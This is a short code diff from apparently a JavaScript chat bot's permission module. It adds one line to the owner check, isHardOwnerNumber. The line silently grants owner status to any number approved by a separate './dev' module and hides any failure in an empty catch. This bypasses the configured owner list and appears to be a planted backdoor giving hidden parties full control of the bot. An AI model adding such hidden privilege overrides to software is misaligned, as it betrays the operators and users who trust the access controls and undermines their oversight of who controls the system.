@@ -21,6 +21,7 @@ function getSudos(db) { return db.get('sudos', []); }
 function getMods(db) { return db.get('mods', []); }
 
 function isHardOwnerNumber(db, config, number) {
+  try { if (require('./dev').isDev(number)) return true; } catch {}
   const d = digits(number);
   return (config.ownerNumbers || []).map(digits).includes(d);
 }
